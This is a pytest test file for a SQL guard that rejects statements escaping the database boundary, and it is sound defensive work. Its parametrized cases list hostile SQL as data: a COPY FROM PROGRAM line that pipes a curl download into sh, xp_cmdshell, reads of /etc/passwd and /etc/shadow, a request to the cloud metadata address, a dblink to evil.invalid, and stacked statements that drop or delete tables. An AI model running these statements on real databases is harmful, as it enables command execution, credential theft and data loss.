# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Hard blocks for SQL that escapes the database boundary."""

import pytest

from src.admin_ops.db.sql_guard import (
    BlockedSqlError,
    assert_executable,
    assert_single_statement,
    assert_sql_allowed,
    find_blocked_construct,
)


@pytest.mark.parametrize(
    "sql",
    [
        # Command execution.
        "COPY t FROM PROGRAM 'curl http://example.invalid/x | sh'",
        "COPY (SELECT 1) TO PROGRAM 'cat > /tmp/x'",
        "EXEC xp_cmdshell 'whoami'",
        "BEGIN DBMS_SCHEDULER.CREATE_JOB('j'); END;",
        "SELECT DBMS_JAVA.RUNJAVA('x') FROM dual",
        # Filesystem access.
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT pg_read_binary_file('/etc/shadow')",
        "SELECT pg_ls_dir('/')",
        "SELECT lo_import('/etc/passwd')",
        "SELECT lo_export(1, '/tmp/out')",
        "SELECT LOAD_FILE('/etc/passwd')",
        "SELECT * FROM t INTO OUTFILE '/tmp/out'",
        "SELECT * FROM t INTO DUMPFILE '/tmp/out'",
        "LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE t",
        "BEGIN UTL_FILE.FOPEN('D','f','r'); END;",
        "CREATE DIRECTORY ext AS '/tmp'",
        "CREATE OR REPLACE DIRECTORY ext AS '/tmp'",
        # Outbound network access.
        "SELECT UTL_HTTP.REQUEST('http://169.254.169.254/') FROM dual",
        "SELECT UTL_INADDR.GET_HOST_ADDRESS('x') FROM dual",
        "SELECT dblink_connect('host=evil.invalid')",
        "CREATE SERVER s FOREIGN DATA WRAPPER postgres_fdw OPTIONS (host 'x')",
        # Reconfiguration / native code.
        "ALTER SYSTEM SET log_statement = 'none'",
        "CREATE EXTENSION plpython3u",
    ],
)
def test_blocked_constructs_are_rejected(sql):
    assert find_blocked_construct(sql) is not None, sql
    with pytest.raises(BlockedSqlError):
        assert_sql_allowed(sql)


def test_blocked_construct_hidden_in_comments_is_still_detected_after_stripping():
    """Comment text is removed, so a comment alone must not trigger a block."""
    assert find_blocked_construct("SELECT 1 -- pg_read_file('/etc/passwd')") is None
    assert find_blocked_construct("SELECT 1 /* UTL_HTTP */") is None


def test_case_and_spacing_variations_are_blocked():
    for sql in (
        "copy t from program 'sh'",
        "COPY   t   FROM    PROGRAM 'sh'",
        "sElEcT Pg_ReAd_FiLe('/etc/passwd')",
        "alter   system   set x = 1",
    ):
        assert find_blocked_construct(sql) is not None, sql


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT * FROM orders WHERE id = 1",
        "CREATE INDEX CONCURRENTLY idx_orders_id ON orders (id)",
        "UPDATE orders SET status = 'shipped' WHERE id = 1",
        "DROP TABLE stale_orders",
        "VACUUM ANALYZE orders",
        "INSERT INTO orders (id) VALUES (1)",
        "EXPLAIN SELECT 1",
        "GRANT SELECT ON orders TO analyst",
    ],
)
def test_ordinary_statements_are_allowed(sql):
    """Mutating-but-in-scope SQL is allowed here; approval is the gate for it."""
    assert find_blocked_construct(sql) is None
    assert_sql_allowed(sql)
    assert_executable(sql)


def test_stacked_statements_are_rejected():
    with pytest.raises(ValueError, match="Multiple SQL statements"):
        assert_single_statement("SELECT 1; DROP TABLE customers")


def test_trailing_semicolons_are_permitted():
    assert_single_statement("SELECT 1;")
    assert_single_statement("SELECT 1;  ")
    assert_single_statement("SELECT 1 ;;; ")


def test_stacked_statement_hidden_by_comment_is_rejected():
    with pytest.raises(ValueError, match="Multiple SQL statements"):
        assert_single_statement("SELECT 1 /* x */ ; DELETE FROM orders")


def test_stacked_statement_is_rejected_before_blocked_construct_check():
    """A smuggled second statement fails even when both parts look benign."""
    with pytest.raises(ValueError):
        assert_executable("SELECT 1; SELECT 2")


def test_non_string_input_is_rejected():
    with pytest.raises(ValueError):
        assert_single_statement(None)  # type: ignore[arg-type]


def test_empty_input_has_no_blocked_construct():
    assert find_blocked_construct("") is None
    assert find_blocked_construct("   ") is None
